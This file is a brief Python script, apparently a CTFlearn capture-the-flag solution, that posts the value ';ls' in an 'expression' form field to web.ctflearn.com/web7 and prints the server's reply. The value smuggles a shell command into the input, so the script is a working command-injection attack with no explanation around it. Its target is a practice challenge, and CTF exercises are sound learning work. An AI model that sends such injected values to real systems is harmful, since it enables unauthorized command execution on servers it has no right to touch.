#!/usr/bin/env python3

import requests

url = "https://web.ctflearn.com/web7/"

result = requests.post(url, data={'expression': ';ls'})
print(result.status_code)
print(result.text)
